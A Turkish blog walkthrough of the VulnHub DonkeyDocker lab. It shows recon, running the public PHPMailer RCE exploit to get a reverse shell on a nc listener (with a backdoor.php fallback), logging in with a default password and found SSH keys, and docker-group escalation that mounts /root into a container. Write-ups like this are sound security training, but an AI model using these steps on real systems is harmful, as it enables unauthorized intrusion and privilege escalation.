---
layout: post
title: DonkeyDocker Walkthrough
date: '2017-07-03 23:00:00 +0300'
categories: blog
---


Selam,
Finallerimiz bitince 4 arkadaş herkes elinden geldiğince bir vm çözsün ve yayınlayalım dedik,
süre belirledik ve çözmeyen kişi veya kişiler bu ruleti ana sisteminde yedek almadan oynayacak diye karar aldık.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/ScriptFoalsRulet.png)

Bu vesileyle bana da **DonkeyDocker** düştü ve tam çözümünü yaptık, sizlerle paylaşmak istedik. Keyifli okumalar.

__DonkeyDocker__

VM hakkında ayrıntılı bilgi alabileceğiniz ve indirme bağlantısını bulabileceğiniz link aşağıdadır

[VulnHub](https://www.vulnhub.com/entry/donkeydocker-1,189/)

__VM çözümü__

İlk önce hedef sistemi bulmak için

```
arp -a
```

komutu ile **arp** tablosunu edinip hedefimizi *192.168.2.8* **IP adresi** nde buluyoruz

```
nmap -n -p 1-65535 -sV 192.168.2.8 --open
```

ile tüm açık tcp portlarını listeliyoruz ve sadece **http(80)** ve **ssh(22) TCP** portu açık görüyoruz

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/01.png)

bunun üzerine **HTTP** portuna yönelip browserımızda

```
192.168.2.8
```

adresine gitmeyi deniyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/02.png)

Siteye girdiğimizde bizi vm hakkında ve hazırlayan hakkında
bilgilendiren bir sayfa karşılıyor ve sayfa kodlarında da birşey bulamayınca, 
hemen adresi *owasp zap* aracında tarattığımızda **robots.txt** yi görünce kalbimiz çarpsa
da içinden birşey çıkmıyor. **Dirb**den yardım dilenerek 

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/03.png)

birkaç ek sayfa daha buluyoruz tabi bulduklarımıza gözatmayı ihmal etmiyoruz
*http://192.168.2.8/mailer/examples/index.html* sayfasını ziyaret ediyoruz ve 
**phpmailer** anahtar sözcüğünü biyere not ediyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/04.png)

Sistem hakkında bilgiler toplamak için

```
curl -I http://192.168.2.8/
```

komutunu kullansakta yalnızca **apache** versiyonunu öğrenebiliyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/05.png)

Elde edilen bilgiler bir ipucuna götürmediği için yönümüzü **exploit** aramaya çeviriyoruz.
**Apache** versiyonundan birşey yakalayamıyoruz ancak, **phpmailer** ilgimizi çekmeye başlıyor.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/06.png)

Vm çözmenin %90 ı okumaktır deyip *nasıl öğrenirim ben bu versiyonu?* sorusuyla google a gidiyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/07-1.png)

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/07-2.png)

**VERSION** dosyasında yazdığını öğrenip *acaba mı?* diyerek bir elimiz kalbimizde bakıyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/07-3.png)

versiyonu görünce hemen download arıyor gözlerimiz **exploitdb**de 
pythona ihanet olmaz diyerek **PHPMailer < 5.2.18 Remote Code Execution (Python)** 
yazısına 3-5-10 kere tıklıyoruz ve indiriyoruz

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/08.png)

**vim** ile kendimize göre düzenleyip (anarcoder fantezi yazısını silmeniz veya dosyanın en başına

```
# -*- coding: utf-8 -*-
```    
yazmanız gerekmekte) kaydedip çalıştıramıyoruz çünkü eksik kütüphanemiz varmış, onu da

```
pip2 install requests_toolbelt
```

ile indirip

```
nc -lvp 8080
```

ile **8080** portumuzu dinlerken exploitimizi

```
python 40974.py
```

ile çalıştırıyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/09.png)

uzun sayılabilecek bir süre bekledikten sonra işlemimiz bitiyor.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/10.png)

*reverse shell* imiz düşmezse **nc** dinlemeye devam ederken firefoxdan

```
http://192.168.2.8/backdoor.php
```

sayfasını ziyaret etmeniz yeterli olacaktır.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/11.png)

biraz genel geçer arama yapıyoruz smith kullanıcı adını öğreniyoruz fakat bir açık göremeyince

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/12.png)

yok artık exploit sonrası *ssh bruteforce* mu? dememize kalmadan

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/13.png)

publickey veremediğimiz için onuda yapamıyoruz ve tekrar aramaya başlıyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/grumpycat.png)

```
su smith
```

ile geçiş yapmayı denesekte gerçek bir shell olmadığı için hata alıp elimiz kolumuz bağlı oturuyoruz
*shell spawning* yollarına bakıp python yine gözükünce hemen yapıştırıyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/14.png)

ve **su smith** denememizi yapıyoruz nitekim *shell* konusunda sorun çıkmıyo ama **parola?**
*qwe123* ler *password* ler havada uçuşurken **GameOfPwners** ta ipucu olarak *ön tanımlı parola*
denilen *kullanıcı adı* geliyo aklımıza ve parolaya da **smith** yazıyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/15.png)


![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/OMG.png)

eşimizi dostumuzu ekran başına çağırıp göstermeden devam etmeyelim lütfen... 
arıyoruz tarıyoruz fakat yine kitlenince *flag* daki *PS* (not) dikkatimizi çekiyor ve **grep** ten zarar gelmez diyip

```
grep -ar "1984"
grep -ari "george"
grep -ari "orwell"
```
    
![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/16.png)

denediğimize değdiğini görüyoruz. Tabi durmayıp dizine gidiyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/17.png)

dizinin komple bir link olduğunu (**S**) ve *orwell* isimli bir kullanıcıya *parolasız* bağlanılması için **key** kaydı yapıldığını görüyoruz
nasıl bunu kullanırım sorusunun cevabını ssh manualinde arayıp bulduktan sonra

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/18.png)

id_ed25519 ve id_ed25519.pub dosyalarını kalimizde aynen oluşturup(içeriklerini kopyalayıp) acımadan kullanıyoruz

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/19.png)

__İÇERDEMA__

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/20.png)


![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/ibo.png)

ve tabi bi flagınızı alırız diyerek

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/21.png)

yine aramalarımıza hız vererek (güya daha deneyimliyiz ya)

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/22.png)


![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/23.png)

ilginç birşeyle karşılaşıyoruz.Şahsen benim için ilk kez karşılaştığımdan dolayı ilginç
"nedir bu busybox?" diye ararken androidleri root etmede kullanıldığını genel linux uygulamalarını içerdiğini öğreniyoruz.
ve **Shell** imizin **ash(Almquist shell)** olduğunu ayrıca **orwell** imizin docker grubuna dahil olduğunu öğreniyoruz.
Dolayısıyla dockerında manuelini okumaya ve internetten araştırmaya başlıyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/24.png)


![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/25.png)

```
docker container ls
```

ile containerleri listeliyoruz ve sadece **donkeydocker** adlı bir container olduğunu görüyoruz.
Bu containerın neler çalıştırdığına göz atarak *main.sh* ı görüyoruz

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/26.png)

dolayısıyla ona ulaşmaya çalışarak komutlarımızı

```
docker container exec donkeydocker
```

ın sonuna ekliyoruz. Fakat containerın ayaklanmasında kullanılan komutlar olduğunu görüp

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/27.png)

zaten containerda **root** muşuz napalım main.sh ı diyerek umursamıyoruz

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/28.png)

hatta bir ara tembellik bayrağını elimize alıp taşıyıp bıraktığımız bile oluyor

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/29.png)

flag arıyoruz ama flag containerda olmadığından dolayı bulamıyoruz

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/30.png)

burası beni en çok yoran kısım oldu çünkü birşeyi öğren uygula ve hatta kötüye kullan **okadar da hızlı** yapılamıyor

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/cahil.png)

Docker grubunun root grubuna eş değer olduğunu, dolayısıyla atlatılabildiğini [şu abimizden](https://reventlov.com/advisories/using-the-docker-command-to-root-the-host) öğrendim.
Tabi basit değişiklikler yaparak uyguladım (debian yerine **ubuntu** ve **aucc** ler)
Bir klasör oluşturup içerisine Dockerfile adında bir dosyaya

```
FROM ubuntu:14.04
ENV WORKDIR /aucc
RUN mkdir -p $WORKDIR
VOLUME [ $WORKDIR ]
WORKDIR $WORKDIR
```

yazıyoruz ve 

```
docker build -t aucc-docker-image .
```

ile build ediyoruz
    
![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/31.png)


![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/32.png)

```
docker run -v /root:/aucc -t aucc-docker-image /bin/bash -c 'ls -l'
```

ile dosya ve dizinleri listeleyip

```
docker run -v /root:/aucc -t aucc-docker-image /bin/bash -c 'cat flag.txt'
```

ile flagımızı görüp şaşı bakan gözlerimizi dinlendiriyoruz

![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/33.png)


![]({{ AUCyberClub.github.io }}/assets/img/donkeydocker/devamedebilirim.png)


 ---
 **[Hüseyin Erdem](https://twitter.com/rootofarch)**
